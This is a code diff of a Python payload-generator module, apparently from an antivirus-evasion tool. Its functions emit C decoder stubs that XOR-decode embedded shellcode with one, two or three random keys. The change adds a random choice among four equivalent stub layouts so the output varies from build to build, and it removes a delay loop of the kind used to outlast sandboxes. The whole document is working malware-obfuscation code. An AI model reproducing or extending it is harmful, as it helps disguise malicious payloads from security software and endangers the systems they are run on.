@@ -106,19 +106,65 @@ def Xor_stub2(shellcode,bufname):
     Randflag2 = varname_creator()
     keyname = varname_creator()
 
+    Encoded_buffer = "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
+
     Xor_stub = ""
-    Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
-    Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
-    Xor_stub += "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2 + " = 0;\n}" 
-    Xor_stub += "else{\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"      
+
+    StubSelect=random.randint(1,4)
+
+    if StubSelect == 1:
+
+
+        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+
+    if StubSelect == 2:
+
+
+        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+
+    if StubSelect == 3:
+
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " +=1;}\n"
+
+    if StubSelect == 4:
+
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " +=1;}\n"              
     
-    return Xor_stub
+    return (Encoded_buffer,Xor_stub)
 
 def Doublexor_stub2(shellcode,bufname):
     keysize1=random.randint(12,24)
@@ -182,39 +228,105 @@ def Doublexor_stub2(shellcode,bufname):
     keyname2 = varname_creator()
     keynamestep1 = varname_creator()
     keynamestep2 = varname_creator()
-    Randbig = str(random.randrange(100000000,200000000,10))
-    Randcpt= varname_creator()
-    Randi = varname_creator()
 
+
+    Encoded_buffer = "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
 
     Xor_stub = ""
-    Xor_stub += "int " + Randflag1 + ";\n"
-    Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
-    Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
-    Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
-    Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
-    Xor_stub += "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
-    Xor_stub += "int " + Randi + " = " + str(random.randrange(10,99,2)) + ";\n"
-    Xor_stub += "int " + Randcpt + "  = " + Randbig + ";\n"
-    Xor_stub += "while ( " + Randcpt + " > " + Randi + " ){\n"
-    Xor_stub += Randcpt + " = " + Randcpt + " - 1;}\n"
-    Xor_stub += "if("+ Randcpt + " == " + Randi + "){\n"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
-    Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2 + " = 0;\n}"
-    Xor_stub += "else{\n"
-    Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}}"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
-    Xor_stub += Randflag4 + " = 0;\n}" 
-    Xor_stub += "else{\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
-    Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"      
+
+    StubSelect=random.randint(1,4)
+
+    if StubSelect == 1:
+
+        Xor_stub += "int " + Randflag1 + ";\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"  
+
+    if StubSelect == 2:
+
+        Xor_stub += "int " + Randflag1 + ";\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 
+
+    if StubSelect == 3:
+
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"   
+
+    if StubSelect == 4:
+
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"    
     
-    return Xor_stub
+    return (Encoded_buffer,Xor_stub)
 
 def Triplexor_stub2(shellcode,bufname):
     keysize1=random.randint(12,24)
@@ -296,45 +408,141 @@ def Triplexor_stub2(shellcode,bufname):
     keyname3 = varname_creator()
     keynamestep1 = varname_creator()
     keynamestep2 = varname_creator()
-    Randbig = str(random.randrange(100000000,200000000,10))
-    Randcpt= varname_creator()
-    Randi = varname_creator()
 
+    Encoded_buffer = "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
 
     Xor_stub = ""
-    Xor_stub += "int " + Randflag1 + ";\n"
-    Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
-    Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
-    Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
-    Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
-    Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
-    Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
-    Xor_stub += "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
-    Xor_stub += "int " + Randi + " = " + str(random.randrange(10,99,2)) + ";\n"
-    Xor_stub += "int " + Randcpt + "  = " + Randbig + ";\n"
-    Xor_stub += "while ( " + Randcpt + " > " + Randi + " ){\n"
-    Xor_stub += Randcpt + " = " + Randcpt + " - 1;}\n"
-    Xor_stub += "if("+ Randcpt + " == " + Randi + "){\n"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
-    Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2 + " = 0;\n}"
-    Xor_stub += "else{\n"
-    Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
-    Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
-    Xor_stub += Randflag3 + " = 0;\n}"
-    Xor_stub += "else{\n"
-    Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
-    Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}}"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
-    Xor_stub += Randflag4 + " = 0;\n}" 
-    Xor_stub += "else{\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
-    Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"      
+
+    StubSelect=random.randint(1,4)
+
+    if StubSelect == 1:
+
+        Xor_stub += "int " + Randflag1 + ";\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
+        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
+        Xor_stub += Randflag3 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
+        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"
+
+    if StubSelect == 2:
+
+        Xor_stub += "int " + Randflag1 + ";\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key3 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
+        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
+        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
+        Xor_stub += Randflag3 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 
+
+    if StubSelect == 3:
+
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
+        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
+        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
+        Xor_stub += Randflag3 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
+        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+
+    if StubSelect == 4:
+
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
+        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
+        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
+        Xor_stub += Randflag3 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
+        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+
+ 
     
-    return Xor_stub
+    return (Encoded_buffer,Xor_stub)
